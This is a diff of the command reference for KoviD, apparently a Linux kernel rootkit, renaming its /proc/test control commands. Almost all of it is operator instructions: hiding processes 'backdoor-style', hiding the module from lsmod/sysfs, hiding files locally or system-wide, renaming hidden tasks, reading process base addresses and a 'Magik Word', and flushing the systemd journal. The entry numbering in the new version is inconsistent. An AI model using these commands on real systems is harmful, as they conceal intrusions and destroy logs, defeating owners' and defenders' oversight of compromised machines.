@@ -21,72 +21,62 @@
     $ echo <pid> >/proc/test
 
 #6 Hide a PID in backdoor-style, hide children
-    $ echo "-bd <pid> >/proc/test
+    $ echo hide-task-backdoor=<pid> >/proc/test
 
 #7 Undo #6
     $ echo <pid> >/proc/test
 
 #8 Hide KoviD module from lsmod/sysfs  if not built with DEPLOY=1
-    $ echo "-h" >/proc/test
+    $ echo hide-lkm >/proc/test
 
 #9 Undo #8 - can rmmod after
-    $ cat `/proc/test` >/proc/test
+    $ echo unhide-lkm=`cat /proc/test` >/proc/test
 
 #10 List hidden taks - debug mode only
-    $ echo "-s" >/proc/test
+    $ echo list-hidden-tasks >/proc/test
     $ dmesg
 
 #11 Hide README.txt
     # At current directory only
-        $ echo "-a README.txt" >/proc/test
+        $ echo hide-file=README.txt >/proc/test
     # At full-path
-        $ echo "-a /home/files/README.txt" >/proc/test
+        $ echo hide-file=/home/files/README.txt >/proc/test
 
-#11 Hide README.txt globally - hide all instances of README.txt
+#12 Hide README.txt globally - hide all instances of README.txt
         # bypass #10 and #11
-        $ echo "-g README.txt" >/proc/test
+        $ echo hide-file-anywhere=README.txt >/proc/test
 
+#15 Undo #12 - this bypass #11
+    $ echo unhide-file=README.txt >/proc/test
 
-#13 Hide ALL files named README.txt - this bypass #11
-    $ echo "-a README.txt" >/proc/test
-
-#14 Undo #12 - this bypass #11
-    $ echo "-d README.txt" >/proc/test
-
-#15 List hidden tasks - debug mode only
-    $ echo "-s" >/proc/test
+#16 List hidden tasks - debug mode only
+    $ echo list-hidden-tasks >/proc/test
     $ dmesg
 
-#16 List hidden files and directories - debug mode only
-    $ echo "-l" >/proc/test
+#17 List hidden files and directories - debug mode only
+    $ echo list-hidden-files >/proc/test
     $ dmesg
 
-#17 Mark tty log file to be removed when KoviD is rmmod'ed
-    $ echo "-t0" >/proc/test
-
-#18 Undo #15
-    $ echo "-t1" >/proc/test
-
-#19 Fetch the base address of a running process by PID number
-    $ echo "-b <PID>">/proc/test
+#18 Fetch the base address of a running process by PID number
+    $ echo base-address=<pid> >/proc/test
     $ cat /proc/test
 
-#20 Fetch Magik Word
+#19 Fetch Magik Word
     $ cat /proc/test
 
-#21 Rename a hidden process
+#20 Rename a hidden process
     # First hide 1234 pid:
         $ echo 1234 >/proc/test
     # Then rename it at any time
-        $ echo "-n 1234 name"
+        $ echo rename-task=1234,NewName >/proc/test
     # Check if it worked:
-        $ echo -s > /proc/test
+        $ echo list-hidden-tasks > /proc/test
     # Or to print all tasks (hidden or not)
-        $ echo -S > /proc/test
+        $ echo list-all-tasks > /proc/test
 
-#22 Clear journal
+#23 Clear journal
     # May need to be called twice,
     # until it is cleared, given vacuum limitation.
     # check with journalctl
-    $ echo -j > /proc/test
+    $ echo journal-flush > /proc/test
 
